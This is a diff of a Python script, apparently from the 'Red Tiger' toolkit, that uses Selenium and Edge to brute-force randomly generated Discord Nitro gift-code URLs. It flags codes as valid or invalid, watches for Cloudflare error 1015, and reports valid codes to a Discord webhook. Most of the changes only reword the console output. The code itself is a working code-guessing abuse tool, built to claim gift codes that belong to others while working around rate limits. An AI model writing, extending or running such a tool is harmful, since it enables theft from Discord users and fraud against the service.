@@ -1,5 +1,5 @@
+from Config.Util import *
 from Config.Config import *
-
 from selenium import webdriver
 from selenium.webdriver.edge.service import Service as EdgeService
 from selenium.webdriver.edge.options import Options as EdgeOptions
@@ -25,9 +25,8 @@ try:
 
    driver = webdriver.Edge(service=edge_service, options=edge_options)
 except:
-   print(f"{color.RED}[X] | Edge not installed or driver not up to date.")
-   Continue()
-   Reset()
+   ErrorEdge()
+
 while True:
  
  def generer_caracteres_aleatoires(longueur):
@@ -53,10 +52,10 @@ while True:
         break
 
  if found:
-    print(f"{color.RED}[X] | {color.CYAN}{site_url}{color.RED} | Nitro Invalid{color.RESET}")
+    print(f"{color.RED}[X] | Nitro Invalid | {color.WHITE}{site_url}{color.RESET}")
  else:
   if "1015" in driver.page_source:
-    print(f"{color.RED}[X] | {color.CYAN}{site_url}{color.RED} | Error 1015{color.RESET}")
+    print(f"{color.RED}[X] | Error 1015 | {color.WHITE}{site_url}{color.RESET}")
     time.sleep(0.3)
   else:
          if webhook in ['y']:
@@ -73,7 +72,7 @@ while True:
              }
 
                 response = requests.post(webhook_url, data=json.dumps(payload), headers=headers)
-            username = 'Red-Tiger'
+            username = 'Red Tiger'
             url = 'https://cdn.discordapp.com/attachments/1184160374342299688/1184160439001686056/IMG_1506.png?ex=658af659&is=65788159&hm=9a0297ee590e78acbafc75bc4686ce2b553e40a2f2a850101378a09f23e32d08&'
             message = site_url
             embed_content = {
@@ -87,7 +86,7 @@ while True:
             }
 
             send_embed_webhook(webhook_url, embed_content)
-            print(f"{color.GREEN}[+] | {color.CYAN}{site_url}{color.GREEN} | Nitro Found{color.RESET}")
+            print(f"{color.GREEN}[+] | Nitro Valid | {color.WHITE}{site_url}{color.RESET}")
          else:
-           print(f"{color.GREEN}[+] | {color.CYAN}{site_url}{color.GREEN} | Nitro Found{color.RESET}")
+           print(f"{color.GREEN}[+] | Nitro Valid | {color.WHITE}{site_url}{color.RESET}")
  continue
